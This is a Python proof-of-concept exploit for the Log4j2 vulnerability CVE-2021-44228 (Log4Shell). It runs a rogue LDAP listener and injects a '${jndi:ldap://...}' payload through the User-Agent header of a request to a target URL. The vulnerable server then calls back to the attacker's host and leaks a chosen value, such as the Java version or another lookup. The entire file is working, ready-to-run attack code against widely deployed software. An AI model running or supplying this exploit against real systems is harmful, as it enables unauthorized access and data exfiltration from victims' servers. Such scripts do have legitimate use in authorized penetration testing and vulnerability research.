#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import time
import threading
import socketserver
import fire
from loguru import logger

import requests

LDAP_HEADER = b'\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a'

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass

class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
    def handle(self) -> None:
        logger.info(f"New connection from {self.client_address[0]}")
        sock = self.request
        sock.recv(1024)
        sock.sendall(LDAP_HEADER)
        data = sock.recv(1024)[9:]  # strip header
        # example response
        # ('Java version 11.0.13\n'
        #  '\x01\x00\n'
        #  '\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b'
        #  'objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2')
        data = data.decode(errors = 'ignore').split('\n')[0]
        logger.info(f"Extracted value: {data}")

class ApacheLog4j2(object):
    """
    CVE: CVE-2021-44228 - Apache Log4j2 2.14.1 - PoC - Information Disclosure
    Versions <= 2.14.1
    Exploit Authors: leonjza

    Reference:
        https://www.exploit-db.com/exploits/50590
        https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
        https://logging.apache.org/log4j/2.x/
        https://twitter.com/Black2Fan/status/1470281005038817284
        https://twitter.com/Rayhan0x01/status/1469571563674505217
    """
    def __init__(self, target, lhost = "127.0.0.1", lport = 8888, rhost = "127.0.0.1", leak = "${java:version}") -> None:
        """
        a simple log4j<=2.14 information disclosure poc

        Args:
            target(str) : target url
            lhost(str) : log4j2 server's address (default is 127.0.0.1)
                exploit server host to listen on (default: 127.0.0.1)
            lport(int) : log4j2 server's port (default is 8888)
                exploit server port to listen on (default: 8888)
            rhost(str) : ldap server's address (default is 127.0.0.1)
                host where (this) exploit server is reachable
            leak(str) : value to leak. (default: ${java:version})
        """
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.rhost = rhost
        self.leak = leak

    def apache_log4j2_poc(self):
        logger.info(f"Starting server on {self.lhost}:{self.lport}")
        server = ThreadedTCPServer((self.lhost, self.lport), ThreadedTCPRequestHandler)
        serv_thread = threading.Thread(target = server.serve_forever)
        serv_thread.daemon = True
        serv_thread.start()
        time.sleep(1)
        logger.info(f"Server started")
        payload = f"${{jndi:ldap://{self.rhost}:{self.lport}/{self.leak}}}"
        logger.info(f"Sending exploit payload {payload} to {self.target}")

        try:
            response = requests.get(self.target, headers = {"User-Agent": payload})
            logger.info(f"Got response from {self.target}: {response.status_code}")
            logger.info(f"Response: {response.text}")
        except Exception as e:
            logger.error(f"Failed to send exploit payload {payload} to {self.target}. {e}")
        finally:
            server.shutdown()
            server.server_close()

if __name__ == '__main__':
    fire.Fire(ApacheLog4j2)
